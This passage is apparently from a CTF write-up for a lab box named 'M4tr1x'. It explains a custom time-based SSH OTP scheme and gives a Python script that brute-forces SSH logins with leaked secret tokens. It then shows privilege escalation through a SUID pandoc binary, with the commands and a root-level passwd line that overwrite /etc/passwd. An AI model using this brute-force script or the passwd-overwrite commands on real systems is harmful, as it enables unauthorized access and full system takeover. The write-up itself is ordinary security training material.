The UC is then passed through the SHA-256 hashing algorithm, transforming it into a 256-bit (or 64-character hexadecimal) **Hashed Code (HC)**. This one-way hashing process adds another layer of security, making it practically impossible to reverse-engineer the UC or SST from the hashed value. After hashing, the output is truncated — typically by extracting a portion of the hexadecimal string — to create a shorter, usable OTP. This final truncated result becomes the SSH OTP code that the user presents for authentication.

Crucially, the entire process is governed by a time-check mechanism. The OTP remains valid only for 60 seconds. Once that period passes, the current time values are updated, which triggers a recomputation of the CTT and consequently changes the final OTP. This ensures time sensitivity and mitigates replay attacks.

Mathematically, the process combines multiplicative entropy (through the time multiplication), cryptographic mixing (via XOR), and cryptographic hashing (via SHA-256), followed by truncation to produce a compact, secure, and time-bound OTP. It’s a layered approach that ensures the code changes frequently, cannot be predicted without the shared secret, and cannot be reverse-engineered due to strong hashing.

`hardwareToken.jpg` :

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FW6s2xfb4cvh2uemN3mw5%252FScreenshot%2520%281168%29.png%3Falt%3Dmedia%26token%3D751a0bd0-0114-4234-bb4f-e5d95dc8ad74&width=768&dpr=3&quality=100&sign=c1a96ad0&sv=2)

Next thing I did is to unzip the 2 zip files, the `testing.zip` and `DevTools.zip` .

Inside testing.zip is a png file.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F6AKVAmPvBMglznbARh5r%252FScreenshot%2520%281170%29.png%3Falt%3Dmedia%26token%3Dd342394b-1369-4fd6-b035-2e2845daee5a&width=768&dpr=3&quality=100&sign=9b2f6ca2&sv=2)

A collection of 3 Shared Secret Tokens and a username Architect

Inside DevTools.zip is a 2 Python scripts.

`ntp_syncer.py`

```python
from time import ctime
import ntplib

import time
import os

try:
    import ntplib
    client = ntplib.NTPClient()
    response = client.request('10.10.26.145') #IP of linux-bay server
    print(response)
    os.system('date ' + time.strftime('%m%d%H%M%Y.%S',time.localtime(response.tx_time)))
except:
    print('Could not sync with time server.')

print('Done.')
```

Here's the output:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F8u5lpYPua7kgnCJCuGMK%252FScreenshot%2520%281171%29.png%3Falt%3Dmedia%26token%3D0b03a9d2-429a-4c79-8ec8-cde0ece1df09&width=768&dpr=3&quality=100&sign=de7c905f&sv=2)

`TimeSimulator.py`

```python
from datetime import datetime, timedelta
import time
import subprocess
from hashlib import sha256

#shared secret token for OTP calculation
sharedSecret = 0

def TimeSet(country, hours, mins, seconds):
    now = datetime.now() + timedelta(hours=hours, minutes=mins)
    #time units: day, hour, minutes
    CurrentTime = int(now.strftime("%d%H%M"))
    print(country+' =')
    print((now.strftime("Time: %H:%M:%S")))
   
    OTP = (int(CurrentTime)) 
    
    # hash OTP
    hash = (sha256(repr(OTP).encode('utf-8')).hexdigest())
    truncatedOTP = hash[22:44]
    # truncate OTP
    print('OTP: ' + truncatedOTP)

while True:
    print('---------------------------------')
    print('Virtual Time Simulator Alpha 1.5 ')
    print('---------------------------------')
    print('     Updates every minute:       ')
    print('---------------------------------')
    TimeSet('Ukraine', 4, 43, 0)
    print('\n')

    TimeSet('Germany', 13, 55, 0)
    print('\n')

    TimeSet('England', 9, 19, 0)
    print('\n')
    
    TimeSet('Nigeria', 1, 6, 0)
    print('\n')
    
    TimeSet('Denmark', -5, 18, 0)
    
    # keep checking every second - for each passing minute, change OTP code
    time.sleep(1)
    subprocess.call("clear")
```

Here's the output (The OTP change every minute):

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FtqwmCTwr6pXcwzzwPTKu%252FScreenshot%2520%281173%29.png%3Falt%3Dmedia%26token%3De1dfda24-99a3-4fa1-9163-08ce4ad3d591&width=768&dpr=3&quality=100&sign=4945578d&sv=2)

Looks very complex right?

Take a look back at the diagrams and do some Math, here's how it works.

1. The **Computed Time Token (CTT)** is calculated by **multiplying** the current times of Country A (CA), Country B (CB), and Country C (CC) together.
2. Next, the **Unhashed Code (UC)** is generated by performing an **XOR operation** between the **Computed Time Token (CTT)** and the **Shared Secret Token (SST)**.
3. Finally, the Unhashed Code (UC) is passed through a **SHA-256 hashing function** to generate the **Hashed Code (HC)**. This hashed output is then **truncated** to a fixed length to produce the **final One-Time Password (OTP)**.

### Building an OTP-Capturing Exploit to Brute-Force SSH

With this enough informations, we can make a Python script that will Capture the correct OTP for **architect** user.

```python
from datetime import datetime, timedelta
from hashlib import sha256
import random
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
import os
import ntplib

class OTPAttackEngine:
    def __init__(self, token1, token2, token3, target_ip):
        self.token1 = token1
        self.token2 = token2
        self.token3 = token3
        self.target_ip = target_ip
        self.secret_tokens = [token1, token2, token3]

    def configure_timezone(self):
        try:
            print('[*] Switching timezone to UTC')
            print('[*] Current timezone:')
            os.system('sudo timedatectl --value')
            os.system('sudo timedatectl set-timezone UTC')
            print('[+] Timezone updated successfully')
        except:
            print('[-] Failed to set timezone to UTC')

    def synchronize_time(self):
        try: 
            ntp_client = ntplib.NTPClient()
            ntp_client.request(self.target_ip)
            print('[+] Time successfully synced with server')
        except:
            print('[-] Failed to synchronize with the NTP server')

    def calculate_time_offset(self, region, hour_offset, min_offset, sec_offset):
        adjusted_time = datetime.now() + timedelta(hours=hour_offset, minutes=min_offset)
        formatted_time = int(adjusted_time.strftime("%d%H%M"))
        return formatted_time
       
    def generate_otp(self):
        time_a = self.calculate_time_offset('Ukraine', 4, 43, 0)
        time_b = self.calculate_time_offset('Germany', 13, 55, 0)
        time_c = self.calculate_time_offset('England', 9, 19, 0)
        time_d = self.calculate_time_offset('Nigeria', 1, 6, 0)
        time_e = self.calculate_time_offset('Denmark', -5, 18, 0)

        selected_times = random.sample([time_a, time_b, time_c, time_d, time_e], 3)
        combined_time_token = selected_times[0] * selected_times[1] * selected_times[2]

        xor_result = combined_time_token ^ random.choice(self.secret_tokens)
        hashed_result = sha256(repr(xor_result).encode('utf-8')).hexdigest()
        otp_final = hashed_result[22:44]

        return otp_final

    def attempt_ssh_login(self, username, otp_password):
        print(f'[*] Attempting OTP: {otp_password}', end='\r')
        ssh_handler = SSHClient()
        ssh_handler.set_missing_host_key_policy(AutoAddPolicy())
        try:
            ssh_handler.connect(self.target_ip, username=username, password=otp_password, banner_timeout=300)
            return True
        except AuthenticationException:
            pass
        except ssh_exception.SSHException:
            print('[*] SSH rate limiting in effect, retrying...')

def runner():
    token1 = 128939448577488
    token2 = 592988748673453
    token3 = 792513759492579
    target_ip = '10.10.26.145'
    
    attack_engine = OTPAttackEngine(token1, token2, token3, target_ip)

    attack_engine.configure_timezone()
    attack_engine.synchronize_time()

    ssh_user = 'architect'
    while True:
        otp = attack_engine.generate_otp()
        if attack_engine.attempt_ssh_login(ssh_user, otp):
            print(f'[+] Success! Credentials: {ssh_user}:{otp}')
            break

if __name__ == '__main__':
    runner()
```

Run and after a little bit of time, we will correctly capture the correct OTP for **architect.**

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FRcfVV3YEsYDpbzYrtdBt%252FScreenshot%2520%281175%29.png%3Falt%3Dmedia%26token%3D41bb4746-885e-4d76-a138-6f6bfc0274f7&width=768&dpr=3&quality=100&sign=65da42e8&sv=2)

Remember, as soon as you obtain the valid OTP, you should immediately attempt the SSH login—since the OTP refreshes every 60 seconds and will soon become invalid.

## Privilege Escalation

### Capturing the User Flag and Discovering a SUID pandoc Binary

After logging in to SSH:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F9nckxmEXgqRCZFgyGRRX%252FScreenshot%2520%281177%29.png%3Falt%3Dmedia%26token%3D51102021-fc01-414d-9de4-4ca45bb3720e&width=768&dpr=3&quality=100&sign=940e1ae6&sv=2)

user flag!

There's another file named `helloVisitor.txt`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FmSomO26DcRusRCKzPvtj%252FScreenshot%2520%281178%29.png%3Falt%3Dmedia%26token%3D0c7870ad-f6c1-46e7-9fed-da65410b1dc5&width=768&dpr=3&quality=100&sign=2c03e21&sv=2)

Okay?

Next thing I did is to check the SUID Binaries:

```shell
find / -type -04000 2>/dev/null
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FSL2pAiPJaX9e0M1gCmef%252FScreenshot%2520%281179%29.png%3Falt%3Dmedia%26token%3D2f7d0714-a862-4717-903d-c4b77cea7261&width=768&dpr=3&quality=100&sign=1ad67a11&sv=2)

Noticed something??? The **/usr/bin/pandoc.**

### Abusing pandoc via GTFOBins to Overwrite /etc/passwd

If we will go to the [GTFobins](https://gtfobins.github.io/gtfobins/pandoc/#suid), We'll see a privilege escalation technique using pandoc:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FmVvcjDN5F1xpHEyipTJL%252FScreenshot%2520%281180%29.png%3Falt%3Dmedia%26token%3D0b296edb-9ca3-461f-a228-a2748ca8f696&width=768&dpr=3&quality=100&sign=2f1aaa72&sv=2)

With the information we've gathered, we now have the ability to modify the `/etc/passwd` file and insert a new user entry with root privileges.

Here's what we can do, first let's copy the `/etc/passwd` to `/tmp`.

```shell
cp /etc/passwd /tmp
```

Next, we'll modify the duplicated `passwd` file and add a new user with root privileges.

First, let's generate a hash using **openssl.**

```shell
openssl passwd kuroshiro
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FfHAh9kgBnVhAE5dJlGgE%252FScreenshot%2520%281182%29.png%3Falt%3Dmedia%26token%3Db6f5b38d-3c54-47b4-b2f0-2025128998cc&width=768&dpr=3&quality=100&sign=12289a94&sv=2)

Next thing is we will add this generated hash to the duplicated `passwd` file.

```text
kuro:$1$yK9fBU9j$/O6ElpAfqoq4mCHg54bxM.:0:0:kuro:/root:/bin/bash
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FOv836Qwk2l5RTMKsen96%252FScreenshot%2520%281183%29.png%3Falt%3Dmedia%26token%3Dbe2fed11-2e6a-46d2-ba3a-fdd586df9a92&width=768&dpr=3&quality=100&sign=3c822075&sv=2)

Save and the next thing we will do is to execute this command

```shell
cat /tmp/passwd | /usr/bin/pandoc -t plain -o /etc/passwd
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FKdgtwrKykETfBxekzH1E%252FScreenshot%2520%281184%29.png%3Falt%3Dmedia%26token%3D5ce81c21-80cc-46da-a032-a1f477e41fb1&width=768&dpr=3&quality=100&sign=971314a1&sv=2)

What's this command and what it does?

It reads the contents of a modified password file `/tmp/passwd` and uses `pandoc`, a document converter, to output that content as plaintext into the critical system file `/etc/passwd`. Although `pandoc` is typically used for document format conversion, here it is misused as a tool to overwrite `/etc/passwd`, potentially allowing an attacker to insert a new root-level user or manipulate system login information. This is a suspicious command often seen in privilege escalation or persistence attacks, and its execution could compromise the entire system.

### Escalating to Root

All we need to do is to switch to the user that we specify:

```shell
su kuro
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F5ReSW6cYTYOvYWhomaEm%252FScreenshot%2520%281185%29.png%3Falt%3Dmedia%26token%3D1f6c1026-221a-4593-88c3-20a1b4ecc5f2&width=768&dpr=3&quality=100&sign=c04f50c&sv=2)

Here we go—we've gained root access! However, there's a catch: the root flag isn't in the root user's directory, so our task isn't finished just yet.

### Recovering the Hidden Root Flag from an XOR-Encoded Script

We'll use the `find` command to locate the exact location where the flag is hidden.

```shell
find / -name "*root*" 2>/dev/null
```

The output is massive but this one caught my attention:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FqLlsZdLYq9pvWRLbjOCQ%252FScreenshot%2520%281188%29.png%3Falt%3Dmedia%26token%3Dd93051b5-e18b-40ea-a802-82d49401d4d4&width=768&dpr=3&quality=100&sign=b35170bf&sv=2)

Let's check that Python file's content:

```python
from progress.bar import FillingSquaresBar
import time

print('''
$ > REQ> Source: Matrix v.99; Destination: Real world;
$ > EXIT GRANTED;
$ > Exiting Matrix... Entering real world... Please wait...
''')
key = 82
flag = (9087 ^ 75 ^ 90 ^ 175 ^ 52 * 13 * 19 - 18 * 2 + key)

bar = FillingSquaresBar(' LOADING...', max=24)
for i in range(24):
    time.sleep(1)
    # Do some work
    bar.next()
bar.finish()
print('\nFlag{R3ALw0r1D'+str(flag)+'Ez09WExit}') 
print("\nMorpheus: Welcome to the real world... Now... Let's begin your real training...\n")
```

The flag is just XORed, that's all. To solve this and get the full part of the flag, here's what we can do.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FGcXdNI4xem9KBf9kACps%252FScreenshot%2520%281190%29.png%3Falt%3Dmedia%26token%3D42904939-300a-4727-8ef2-cbc735af1f46&width=768&dpr=3&quality=100&sign=c9d192bf&sv=2)

We've got the root flag!

### Cracking the ACP PIN to Capture the Web Flag

Another flag is missing, the **web flag.**

Upon checking the `/etc` directory once again, I noticed this:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FJymFcYiyJnEDDOqYCgBt%252FScreenshot%2520%281191%29.png%3Falt%3Dmedia%26token%3D66c087bd-e496-4103-913e-1bbff205d45e&width=768&dpr=3&quality=100&sign=b3569618&sv=2)

Let's check its content

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FU1RxkLhs5sQJ2Gw3Pj9h%252FScreenshot%2520%281192%29.png%3Falt%3Dmedia%26token%3De2749695-f88d-420a-a55b-3b107eb7fb02&width=768&dpr=3&quality=100&sign=c5c7b876&sv=2)

Here's the solution to get the ACP PIN:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FefRtPfcVfwObt9snk32m%252FScreenshot%2520%281193%29.png%3Falt%3Dmedia%26token%3De97b73a7-dfd2-4515-98f1-762c56ce8b07&width=768&dpr=3&quality=100&sign=45349d9d&sv=2)

Now we can login in myBB's admin panel `/admin`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FGQAxcVHIWpvm28ylA24w%252FScreenshot%2520%281194%29.png%3Falt%3Dmedia%26token%3D39751c3f-0290-4825-b88f-6d2575eca4f9&width=768&dpr=3&quality=100&sign=a587829b&sv=2)

After logging in, here's the result:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FtgdNYASiaiBKl8y04oTj%252FScreenshot%2520%281195%29.png%3Falt%3Dmedia%26token%3Df6d57884-aba9-44eb-8e37-b8815b8ec1ba&width=768&dpr=3&quality=100&sign=6c613063&sv=2)

Web flag!

We've successfully solved M4tr1x!!!!

## Conclusion

This challenge was quite demanding and took a significant amount of time to work through, but the experience was absolutely worthwhile. It tested not only your technical proficiency in writing custom exploits but also your ability to analyze systems and behaviors with precision. From simulating time-based OTPs to manipulating critical system files like `/etc/passwd`, every step required a deep understanding of how Linux authentication works and how to exploit misconfigurations effectively. Overall, it was a comprehensive exercise in both creative thinking and practical offensive security techniques, making it an invaluable learning opportunity for anyone diving deeper into advanced privilege escalation and system exploitation.
